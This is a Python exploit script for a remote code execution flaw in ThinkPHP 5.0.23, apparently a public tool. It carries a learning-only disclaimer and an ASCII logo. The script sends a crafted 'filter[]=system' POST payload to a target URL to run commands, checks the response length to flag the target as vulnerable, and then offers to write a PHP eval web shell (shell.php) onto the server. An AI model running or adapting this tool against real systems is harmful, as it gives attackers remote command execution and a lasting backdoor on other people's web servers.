#!/usr/bin/python3
# @Мартин.
import sys,argparse,textwrap,requests
from loguru import logger
Version = "@Мартин. ThinkPHPV5.0.23 Tool V1.0.0"
Title='''
************************************************************************************
<免责声明>:本工具仅供学习实验使用,请勿用于非法用途,否则自行承担相应的法律责任
<Disclaimer>:This tool is onl y for learning and experiment. Do not use it for illegal purposes, or you will bear corresponding legal responsibilities
************************************************************************************'''
Logo=f'''
 __       __  _______   __    __  _______  
/  \     /  |/       \ /  |  /  |/       \ 
$$  \   /$$ |$$$$$$$  |$$ |  $$ |$$$$$$$  |
$$$  \ /$$$ |$$ |__$$ |$$ |__$$ |$$ |__$$ |
$$$$  /$$$$ |$$    $$/ $$    $$ |$$    $$/ 
$$ $$ $$/$$ |$$$$$$$/  $$$$$$$$ |$$$$$$$/  
$$ |$$$/ $$ |$$ |      $$ |  $$ |$$ |      
$$ | $/  $$ |$$ |      $$ |  $$ |$$ |      
$$/      $$/ $$/       $$/   $$/ $$/       
                                       ThinkPHPV5.0.23    
                Github==>https://github.com/MartinxMax    
        {Version}  
'''

POC="_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]={}"
Header = {
'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.163 Safari/535.1',
'Content-Type': 'application/x-www-form-urlencoded'
}

def Init_Loger():
    logger.remove()
    logger.add(
        sink=sys.stdout,
        format="<green>[{time:HH:mm:ss}]</green><level>[{level}]</level> -> <level>{message}</level>",
        level="INFO"
    )


class verification_Method():
    def __init__(self,args):
        self.URL=args.URL


    def run(self):
        if self.URL:
            self.verification_vulnerability()
        else:
            logger.error("You must fill in the -url parameter")

    def get_Web_Shell(self):
        if self.PAYLOAD('echo "<?php @eval(\$_POST[\'cmd\']);?>" >./shell.php;id') != 0:
            logger.info(f"[INFO]"+(self.URL).replace((self.URL).split('/')[-1],'')+"shell.php [Method POST Key:cmd]")
        else:
            logger.error("Uplaod Fail")


    def verification_vulnerability(self,):
        if self.PAYLOAD() != self.PAYLOAD('id'):
            logger.info(f"The {self.URL} has a ThinkPHP vulnerability")
            while True:
                if input("Try Get WebShell?(y/n)").lower() == 'n':
                    print('[INFO]Exit...')
                else:
                    self.get_Web_Shell()
                sys.exit(1)
        else:
            logger.warning(f"The {self.URL} does not have ThinkPHP vulnerability")

    def PAYLOAD(self,Command=None):#记录首次访问页面大小
        try:
            INFO = requests.post(self.URL + '?s=captcha', headers=Header, data=POC.format(Command if Command else ''),timeout=3)
        except :
            logger.warning("The website cannot be accessed")
            sys.exit(0)
        else:
            if INFO.status_code == 200:
                return len(INFO.text)
            else:
                return 0


def main():
    print(Logo,"\n",Title)
    Init_Loger()
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=textwrap.dedent('''
        Example:
            author-Github==>https://github.com/MartinxMax
        Basic usage:
            python3 {MPHP} -url http://xxx.com
            '''.format(MPHP = sys.argv[0]
                )))
    parser.add_argument('-url', '--URL',default=None, help='Target_URL')
    args = parser.parse_args()
    verification_Method(args).run()


if __name__ == '__main__':
    main()